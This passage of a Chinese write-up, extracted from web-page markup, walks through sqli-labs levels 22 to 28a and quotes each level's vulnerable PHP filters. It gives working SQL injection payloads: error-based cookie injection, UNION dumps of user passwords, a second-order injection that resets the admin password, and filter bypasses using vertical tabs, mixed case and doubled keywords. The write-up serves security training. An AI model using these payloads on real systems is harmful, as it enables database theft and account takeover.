0,1\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$26\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = 'x\\\" OR updatexml(null,concat(0x7e,(SELECT version()),0x7e),null) #'\\npayload = base64.b64encode(payload.encode()).decode()\\nresp = query_post(\\\"Less-22\\\", data={\\\"uname\\\": \\\"admin\\\", \\\"passwd\\\": \\\"admin\\\"}, cookies={\\\"uname\\\": payload})\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$27\"}}]}]]}],[\"$\",\"h2\",null,{\"className\":\"x-h1\",\"children\":\"过滤与绕过：L23-28\"}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L23\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$id = $_GET['id'];\\n$reg = \\\"/#/\\\";\\n$reg1 = \\\"/--/\\\";\\n$replace = \\\"\\\";\\n$id = preg_replace($reg, $replace, $id);\\n$id = preg_replace($reg1, $replace, $id);\\n$sql = \\\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$28\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"注释符被过滤了，那就手动构造一个拼接后语法合法的SQL语句：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE '1'='1\\\"\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE '1'='1\\\"\u003c/span\u003e\"}}]}]]}],[\"$\",\"$L17\",null,{\"src\":\"L23.jpg\",\"width\":\"100%\"}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L24：二次注入\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"L24中所有直接注入点的输入都经过\u003ccode class=\\\"x-inline-highlight\\\"\u003emysql_escape_string\u003c/code\u003e或\u003ccode class=\\\"x-inline-highlight\\\"\u003emysql_real_escape_string\u003c/code\u003e的过滤。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"注意注册新用户的逻辑：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$username = mysql_escape_string($_POST['username']);\\n// ...\\n$sql = \\\"INSERT INTO users (username, password) VALUES (\\\\\\\"$username\\\\\\\", \\\\\\\"$pass\\\\\\\")\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$username\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token function\\\"\u003emysql_escape_string\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token variable\\\"\u003e$_POST\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'username'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token comment\\\"\u003e// ...\u003c/span\u003e\\n\u003cspan class=\\\"token variable\\\"\u003e$sql\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"INSERT INTO users (username, password) VALUES (\\\\\\\"\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$username\u003c/span\u003e\u003c/span\u003e\\\\\\\", \\\\\\\"\u003cspan class=\\\"token interpolation\\\"\u003e\u003cspan class=\\\"token variable\\\"\u003e$pass\u003c/span\u003e\u003c/span\u003e\\\\\\\")\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"如果注册用户的用户名为\u003ccode class=\\\"x-inline-highlight\\\"\u003eadmin' #\u003c/code\u003e（密码为\u003ccode class=\\\"x-inline-highlight\\\"\u003e123\u003c/code\u003e），在经过\u003ccode class=\\\"x-inline-highlight\\\"\u003emysql_escape_string\u003c/code\u003e转义后变成\u003ccode class=\\\"x-inline-highlight\\\"\u003eadmin\u0026#92;' #\u003c/code\u003e，拼接到\u003ccode class=\\\"x-inline-highlight\\\"\u003e$sql\u003c/code\u003e中变成：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"INSERT INTO users (username, password) VALUES (\\\"admin\\\\' #\\\", \\\"123\\\")\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eINSERT\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eINTO\u003c/span\u003e users \u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003eusername\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e password\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eVALUES\u003c/span\u003e \u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\"admin\\\\' #\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"123\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"而这条语句执行后，插入到数据库的用户名中，对单引号的转义被还原：\"}}],[\"$\",\"$L17\",null,{\"src\":\"L24-1.jpg\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"在登录后，服务端设置\u003ccode class=\\\"x-inline-highlight\\\"\u003e$_SESSION[\\\"username\\\"]\u003c/code\u003e为用户名，二次注入的注入点发生在修改密码功能：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$username = $_SESSION[\\\"username\\\"];\\n$curr_pass = mysql_real_escape_string($_POST['current_password']);\\n$pass = mysql_real_escape_string($_POST['password']);\\n$re_pass = mysql_real_escape_string($_POST['re_password']);\\nif($pass==$re_pass) {\\n    $sql = \\\"UPDATE users SET password='$pass' WHERE username='$username' AND password='$curr_pass'\\\";\\n    // ...\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 24px, var(--bg-transparent-golden) 24px 48px, transparent 48px, transparent 144px, var(--bg-transparent-golden) 144px 168px, transparent 168px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$29\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"当用以下表单参数修改密码时：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"current_password    xxx\\npassword            123\\nre_password         123\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"current_password    xxx\\npassword            123\\nre_password         123\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"服务端实际执行的SQL语句为：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"SQL\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"UPDATE users SET password='123' WHERE username='admin' #' AND password='xxx'\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003eUPDATE\u003c/span\u003e users \u003cspan class=\\\"token keyword\\\"\u003eSET\u003c/span\u003e password\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e'123'\u003c/span\u003e \u003cspan class=\\\"token keyword\\\"\u003eWHERE\u003c/span\u003e username\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e'admin'\u003c/span\u003e \u003cspan class=\\\"token comment\\\"\u003e#' AND password='xxx'\u003c/span\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"此时成功在不知道\u003ccode class=\\\"x-inline-highlight\\\"\u003eadmin\u003c/code\u003e用户原密码的情况下，将其密码修改为\u003ccode class=\\\"x-inline-highlight\\\"\u003e123\u003c/code\u003e。\"}}],[\"$\",\"$L17\",null,{\"src\":\"L24-2.jpg\"}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L25\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"过滤\u003ccode class=\\\"x-inline-highlight\\\"\u003eor\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003eand\u003c/code\u003e，可以用\u003ccode class=\\\"x-inline-highlight\\\"\u003e||\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003e\u0026\u0026\u003c/code\u003e绕过。注意我们想查询的列\u003ccode class=\\\"x-inline-highlight\\\"\u003epassword\u003c/code\u003e恰好也包含了\u003ccode class=\\\"x-inline-highlight\\\"\u003eor\u003c/code\u003e，可以双写为\u003ccode class=\\\"x-inline-highlight\\\"\u003epasswoorrd\u003c/code\u003e绕过。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?id=x' UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users -- \\\"\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=x' UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users -- \\\"\u003c/span\u003e\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L25a\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?id=99 UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users -- \\\"\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=99 UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users -- \\\"\u003c/span\u003e\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L26\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"function blacklist($id)\\n{\\n    $id = preg_replace('/or/i', \\\"\\\", $id);       // strip out OR (non case sensitive)\\n    $id = preg_replace('/and/i', \\\"\\\", $id);      // Strip out AND (non case sensitive)\\n    $id = preg_replace('/[\\\\/\\\\*]/', \\\"\\\", $id);    // strip out /*\\n    $id = preg_replace('/[--]/', \\\"\\\", $id);      // Strip out --\\n    $id = preg_replace('/[#]/', \\\"\\\", $id);       // Strip out #\\n    $id = preg_replace('/[\\\\s]/', \\\"\\\", $id);      // Strip out spaces\\n    $id = preg_replace('/[\\\\/\\\\\\\\\\\\\\\\]/', \\\"\\\", $id);  // Strip out slashes\\n    return $id;\\n}\\n$id = $_GET['id'];\\n$id = blacklist($id);\\n$sql = \\\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$2a\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"绕过\u003ccode class=\\\"x-inline-highlight\\\"\u003eor\u003c/code\u003e和注释的思路和之前一样；关于空白符过滤，这里测试下来发现PHP 5.3.29（环境为Windows）中\u003ccode class=\\\"x-inline-highlight\\\"\u003epreg_match\u003c/code\u003e的\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\s\u003c/code\u003e不会匹配字符\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\x0B (Vertical Tab)\u003c/code\u003e。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?id=x' UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users WHERE '1'='1\\\"\\npayload = payload.replace(\\\" \\\", \\\"%0b\\\")\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=x' UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users WHERE '1'='1\\\"\u003c/span\u003e\\npayload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e payload\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003ereplace\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\" \\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"%0b\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L26a\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?id=x') UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users WHERE ('1'='1\\\"\\npayload = payload.replace(\\\" \\\", \\\"%0b\\\")\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=x') UNION SELECT 0,group_concat(username),group_concat(passwoorrd) FROM security.users WHERE ('1'='1\\\"\u003c/span\u003e\\npayload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e payload\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003ereplace\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\" \\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"%0b\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L27\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"大小写敏感的关键字过滤，用任意一种大小写变形绕过即可。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"function blacklist($id)\\n{\\n    $id = preg_replace('/[\\\\/\\\\*]/', \\\"\\\", $id);   // Strip out /*\\n    $id = preg_replace('/[--]/', \\\"\\\", $id);     // Strip out --.\\n    $id = preg_replace('/[#]/', \\\"\\\", $id);      // Strip out #.\\n    $id = preg_replace('/[ +]/', \\\"\\\", $id);     // Strip out spaces.\\n    $id = preg_replace('/union/s', \\\"\\\", $id);   // Strip out union\\n    $id = preg_replace('/select/s', \\\"\\\", $id);  // Strip out select\\n    $id = preg_replace('/UNION/s', \\\"\\\", $id);   // Strip out UNION\\n    $id = preg_replace('/SELECT/s', \\\"\\\", $id);  // Strip out SELECT\\n    $id = preg_replace('/Union/s', \\\"\\\", $id);   // Strip out Union\\n    $id = preg_replace('/Select/s', \\\"\\\", $id);  // Strip out select\\n    return $id;\\n}\\n$id = $_GET['id'];\\n$id = blacklist($id);\\n$sql = \\\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$2b\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE '1'='1\\\"\\npayload = payload.replace(\\\" \\\", \\\"%0b\\\")\\npayload = payload.replace(\\\"UNION\\\", \\\"UNiON\\\")\\npayload = payload.replace(\\\"SELECT\\\", \\\"SEleCT\\\")\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$2c\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L27a\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = '?id=x\\\" UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE \\\"1\\\"=\\\"1'\\npayload = payload.replace(\\\" \\\", \\\"%0b\\\")\\npayload = payload.replace(\\\"UNION\\\", \\\"UNiON\\\")\\npayload = payload.replace(\\\"SELECT\\\", \\\"SEleCT\\\")\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$2d\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L28\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"注意\u003ccode class=\\\"x-inline-highlight\\\"\u003e%0b\u003c/code\u003e绕过了正则\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\\s\u003c/code\u003e的判断。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"function blacklist($id)\\n{\\n    $id = preg_replace('/[\\\\/\\\\*]/', \\\"\\\", $id);           //strip out /*\\n    $id = preg_replace('/[--]/', \\\"\\\", $id);             //Strip out --.\\n    $id = preg_replace('/[#]/', \\\"\\\", $id);              //Strip out #.\\n    $id = preg_replace('/[ +]/', \\\"\\\", $id);             //Strip out spaces.\\n    $id = preg_replace('/union\\\\s+select/i', \\\"\\\", $id);  //Strip out UNION \u0026 SELECT.\\n    return $id;\\n}\\n$id = $_GET['id'];\\n$id = blacklist($id);\\n$sql = \\\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\\\";\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$2e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?id=x') UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE ('1'='1\\\"\\npayload = payload.replace(\\\" \\\", \\\"%0b\\\")\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=x') UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE ('1'='1\\\"\u003c/span\u003e\\npayload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e payload\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003ereplace\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string\\\"\u003e\\\" \\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"%0b\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":\"L28a\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"过滤条件跟L28比变少了，只剩这一个：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$id = preg_replace('/union\\\\s+select/i', \\\"\\\", $id);\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token variable\\\"\u003e$id\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token function\\\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token string single-quoted-string\\\"\u003e'/union\\\\s+select/i'\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token string double-quoted-string\\\"\u003e\\\"\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token variable\\\"\u003e$id\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"双写过滤的思路：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"payload = \\\"?id=x') UNION UNION SELECT SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE ('1'='1\\\"\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"payload \u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"?id=x') UNION UNION SELECT SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE ('1'='1\\\"\u003c/span\u003e\"}}]}]]}],[\"$\",\"h2\",null,{\"className\":\"x-h1\",\"children\":\"WAF：L29-L31\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这三个Lab只有闭合方式不一样，核心思路是一样的，因此放到一起说。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"服务端模拟了一个HPP\u003ccode class=\\\"x-inline-highlight\\\"\u003e(HTTP Parameter Pollution)\u003c/code\u003e的场景：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"PHP\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"\u003c?php\\n\\n// WAF implementation with a whitelist approach, only allows input to be numeric.\\nfunction whitelist($input)\\n{\\n    $match = preg_match(\\\"/^\\\\d+$/\\\", $input);\\n    if ($match) {\\n        // ... input is valid\\n    } else {\\n        // ... input is invalid\\n        